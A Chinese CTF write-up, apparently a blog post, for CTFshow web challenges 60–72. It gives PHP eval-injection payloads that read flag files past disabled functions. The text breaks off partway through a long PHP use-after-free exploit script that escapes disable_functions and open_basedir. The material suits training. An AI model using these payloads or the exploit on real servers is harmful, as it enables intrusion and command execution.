+<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<p>show_source被禁用了</p>
+<p>highlight_file可用但是<img src="/2022/03/11/CTFshow2/image-20220204151353485-164701005467513.png" alt="image-20220204151353485"></p>
+<p>这个函数可以用，但是文件变了，查看目录结构</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>));  发现是根目录下<span class="variable">flag.txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
+<p>print_r被禁用了，换成 var_dump即可</p>
+<p><strong>var_dump()</strong> 函数用于输出变量的相关信息，用于打印显示，一个变量的内容与结构，以及类型的信息。</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>)); </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>：<span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>显示highlight_file也被禁用了</p>
+<p>文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p>
+<p><em>include</em> 语句包含并运行指定文件。txt文件无法运行则直接输出</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">error_reporting</span>() 、 <span class="title">ini_set</span>()、 <span class="title">highlight_file</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = ob_get_contents();<span class="regexp">//</span>得到缓冲区的数据。</span><br><span class="line"> ob_end_clean();<span class="regexp">//</span>会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以利用<span class="keyword">exit</span>();停止后面的程序</span><br><span class="line"></span><br><span class="line">payload:c=var_export(scandir(<span class="string">&quot;/&quot;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="不懂web72"><a href="#不懂web72" class="headerlink" title="不懂web72"></a>不懂web72</h2><p><img src="/2022/03/11/CTFshow2/image-20220220152051961-164701005467512.png" alt="image-20220220152051961"></p>
+<p><img src="/2022/03/11/CTFshow2/image-20220220152145730-164701005467514.png" alt="image-20220220152145730">说明没有flag.txt这个文件，也没法查看目录结构</p>
+<p><strong>利用glob协议扫描目录</strong></p>
+<p><img src="/2022/03/11/CTFshow2/image-20220220154514866-164701005467515.png" alt="image-20220220154514866"></p>
+<p>通过这个发现flag在flag0.txt,之后利用uaf的脚本进行命令执行</p>
+<p><code>/*</code>是根目录下所有文件</p>
+<p>由于<code>open_basedir</code>的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把<code>c=</code>之后的内容url编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line"><span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line"><span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line"><span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line"><span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line"><span class="variable">$p_type</span> = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line"><span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;</span><br><span class="line"><span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line"><span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"><span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line"><span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line"><span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) 